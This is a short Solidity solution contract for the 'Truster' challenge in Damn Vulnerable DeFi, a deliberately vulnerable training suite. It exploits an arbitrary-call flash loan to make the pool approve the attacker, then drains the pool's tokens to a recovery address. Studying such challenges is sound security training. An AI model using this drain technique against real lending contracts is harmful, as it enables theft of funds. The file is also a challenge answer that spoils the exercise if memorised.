// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
import {ERC20} from "../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

/// @dev Test-only exploit contract for the Truster challenge.
contract Attacker3 {
    constructor(address pool, address token, address recovery) {
        uint256 amount = 1_000_000e18;

        bytes memory approveCall = abi.encodeWithSelector(
            ERC20.approve.selector,
            address(this),
            amount
        );

        TrusterLenderPool(pool).flashLoan(0, address(0), token, approveCall);
        ERC20(token).transferFrom(pool, recovery, amount);
    }
}
